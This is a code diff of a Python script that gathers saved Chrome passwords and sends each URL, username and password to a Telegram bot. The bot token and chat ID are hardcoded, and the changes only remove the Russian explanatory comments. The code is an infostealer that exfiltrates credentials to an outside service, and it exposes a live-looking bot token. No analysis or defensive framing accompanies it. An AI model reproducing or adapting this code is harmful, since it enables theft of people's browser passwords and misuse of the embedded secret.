@@ -9,21 +9,19 @@ from cryptography.hazmat.backends import default_backend
 from telegram import Bot
 import asyncio
 
-# Замените 'YOUR_BOT_TOKEN' на токен вашего бота
 TELEGRAM_BOT_TOKEN = '7558492008:AAE1ZrjixCRDGxRQaRhmkvXpJpADeIgX2gw'
-# Замените 'YOUR_CHAT_ID' на ваш ID
 CHAT_ID = '874924103'
 
 async def send_passwords_to_telegram(passwords):
     bot = Bot(token=TELEGRAM_BOT_TOKEN)
     
-    # Формируем сообщение
+
     message = "Пароли из Chrome:\n\n"
     
     for url, username, password in passwords:
         message += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"
 
-    # Разбиваем сообщение на части, если оно слишком длинное
+
     max_length = 4096
     for i in range(0, len(message), max_length):
         part = message[i:i + max_length]
